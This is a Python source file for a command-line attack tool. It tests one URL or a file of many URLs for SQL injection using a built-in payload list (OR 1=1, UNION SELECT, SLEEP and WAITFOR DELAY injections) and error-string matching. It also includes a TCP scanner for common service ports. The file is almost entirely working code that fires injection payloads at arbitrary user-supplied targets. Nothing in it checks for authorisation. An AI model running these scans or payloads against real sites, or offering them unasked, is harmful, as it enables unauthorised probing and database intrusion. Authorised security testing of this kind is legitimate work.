import requests
import time
from colorama import Fore, Style
from tqdm import tqdm
import os
import socket
import re

# Common SQL injection payloads
PAYLOADS = [
    "'",
    "1' OR '1'='1",
    "1' AND '1'='1",
    "1' AND SLEEP(5)--",
    "1' UNION SELECT NULL--",
    "1' WAITFOR DELAY '0:0:5'--",
    "admin' --",
    "admin' #",
    "' OR 1=1--",
    "' OR 'x'='x",
]

# SQL error messages to detect
SQL_ERRORS = [
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_result",
    "postgresql error",
    "ora-",
    "sql server",
    "sqlite_error",
    "sqlstate[",
]

def create_results_dir():
    if not os.path.exists("data/results"):
        os.makedirs("data/results")

def sanitize_filename(url):
    """Create a safe filename from URL"""
    # Remove protocol
    url = url.replace('http://', '').replace('https://', '')
    
    # Remove query parameters and special characters
    url = re.sub(r'\?.*$', '', url)  # Remove everything after '?'
    url = re.sub(r'[<>:"/\\|?*&=]', '_', url)  # Replace invalid chars with underscore
    
    # Limit filename length and remove multiple underscores
    url = re.sub(r'_+', '_', url)  # Replace multiple underscores with single one
    url = url[:50]  # Limit length to avoid too long filenames
    
    return url.strip('_')  # Remove leading/trailing underscores

def test_sqli(url, payload):
    try:
        # Add payload to URL parameters
        if "?" in url:
            test_url = f"{url}&param={payload}"
        else:
            test_url = f"{url}?param={payload}"

        # Record start time for time-based detection
        start_time = time.time()
        
        # Send request
        response = requests.get(test_url, timeout=10)
        response_time = time.time() - start_time
        
        # Check for SQL errors in response
        content = response.text.lower()
        for error in SQL_ERRORS:
            if error in content:
                return True, "Error-based", payload
        
        # Check for time-based injection
        if response_time > 5 and "SLEEP" in payload or "WAITFOR" in payload:
            return True, "Time-based", payload
            
        return False, None, None
        
    except requests.exceptions.Timeout:
        if "SLEEP" in payload or "WAITFOR" in payload:
            return True, "Time-based", payload
    except:
        return False, None, None

def single_sqli_scan():
    print(Fore.CYAN + "\n=== Single URL SQL Injection Scanner ===\n")
    
    url = input(Fore.GREEN + "Enter the target URL: " + Style.RESET_ALL)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print(Fore.YELLOW + "\nTesting SQL injection vulnerabilities...")
    
    # Create safe filename from URL
    safe_filename = sanitize_filename(url)
    
    for payload in tqdm(PAYLOADS, desc="Testing payloads"):
        is_vuln, vuln_type, successful_payload = test_sqli(url, payload)
        if is_vuln:
            print(Fore.RED + "\n[!] SQL Injection vulnerability found!")
            print(Fore.RED + f"[+] Type: {vuln_type}")
            print(Fore.RED + f"[+] Payload: {successful_payload}")
            print(Fore.RED + f"[+] URL: {url}")
            
            # Save result with URL in filename
            create_results_dir()
            result_file = f"data/results/sqli_{safe_filename}.txt"
            with open(result_file, "w") as f:
                f.write(f"SQL Injection Scan Results\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target URL: {url}\n")
                f.write(f"Vulnerability Type: {vuln_type}\n")
                f.write(f"Successful Payload: {successful_payload}\n")
                f.write("\nAdditional Details:\n")
                f.write("- The target is vulnerable to SQL injection attacks\n")
                f.write("- This vulnerability could allow unauthorized database access\n")
                f.write("- Immediate remediation is recommended\n")
            print(Fore.GREEN + f"\n[+] Results saved to {result_file}")
            return
    
    print(Fore.GREEN + "\n[+] No SQL injection vulnerabilities found.")

def mass_sqli_scan():
    print(Fore.CYAN + "\n=== Mass URL SQL Injection Scanner ===\n")
    
    file_path = input(Fore.GREEN + "Enter the path to your URLs file: " + Style.RESET_ALL)
    
    if not os.path.exists(file_path):
        print(Fore.RED + "\nError: File not found!")
        return
    
    create_results_dir()
    
    with open(file_path, 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    print(Fore.YELLOW + f"\nLoaded {len(urls)} URLs. Starting scan...")
    
    vuln_count = 0
    for url in tqdm(urls, desc="Scanning URLs"):
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        # Create safe filename from URL
        safe_filename = sanitize_filename(url)
            
        for payload in PAYLOADS:
            is_vuln, vuln_type, successful_payload = test_sqli(url, payload)
            if is_vuln:
                vuln_count += 1
                result_file = f"data/results/sqli_{safe_filename}.txt"
                with open(result_file, "w") as f:
                    f.write(f"SQL Injection Scan Results\n")
                    f.write("=" * 50 + "\n\n")
                    f.write(f"Target URL: {url}\n")
                    f.write(f"Vulnerability Type: {vuln_type}\n")
                    f.write(f"Successful Payload: {successful_payload}\n")
                    f.write("\nAdditional Details:\n")
                    f.write("- The target is vulnerable to SQL injection attacks\n")
                    f.write("- This vulnerability could allow unauthorized database access\n")
                    f.write("- Immediate remediation is recommended\n")
                break
        else:
            with open("data/results/non_vulnerable_urls.txt", "a") as f:
                f.write(f"{url}\n")
    
    print(Fore.GREEN + f"\n[+] Scan completed!")
    print(Fore.GREEN + f"[+] Found {vuln_count} vulnerable URLs")
    print(Fore.GREEN + f"[+] Results saved in data/results/ directory")

def port_scan():
    print(Fore.CYAN + "\n=== Port Scanner ===\n")
    
    target = input(Fore.GREEN + "Enter IP/domain to scan: " + Style.RESET_ALL)
    
    try:
        # Resolve domain to IP if needed
        try:
            ip = socket.gethostbyname(target)
            if ip != target:
                print(Fore.YELLOW + f"\n[*] Resolved {target} to {ip}")
        except socket.gaierror:
            print(Fore.RED + "\nError: Could not resolve hostname")
            return
        
        print(Fore.YELLOW + "\n[*] Starting port scan...")
        open_ports = []
        
        # Create safe filename from target
        safe_filename = sanitize_filename(target)
        
        # Common ports to scan
        common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            143: "IMAP",
            443: "HTTPS",
            445: "SMB",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            8080: "HTTP-Proxy",
            8443: "HTTPS-Alt"
        }
        
        for port in tqdm(common_ports.keys(), desc="Scanning ports"):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                service = common_ports[port]
                open_ports.append((port, service))
            sock.close()
        
        # Save and display results
        if open_ports:
            print(Fore.GREEN + "\n[+] Open ports found:")
            
            if not os.path.exists("data/results"):
                os.makedirs("data/results")
                
            result_file = f"data/results/portscan_{safe_filename}.txt"
            with open(result_file, "w") as f:
                f.write(f"Port Scan Results\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target: {target}\n")
                if ip != target:
                    f.write(f"IP Address: {ip}\n")
                f.write("\nOpen Ports:\n")
                f.write("-" * 20 + "\n")
                
                for port, service in open_ports:
                    result = f"Port {port}: {service}"
                    print(Fore.GREEN + f"[+] {result}")
                    f.write(f"{result}\n")
                    
            print(Fore.GREEN + f"\n[+] Results saved to {result_file}")
        else:
            print(Fore.YELLOW + "\n[-] No open ports found")
            
    except KeyboardInterrupt:
        print(Fore.RED + "\n\nScan interrupted by user")
    except Exception as e:
        print(Fore.RED + f"\nError during scan: {str(e)}") 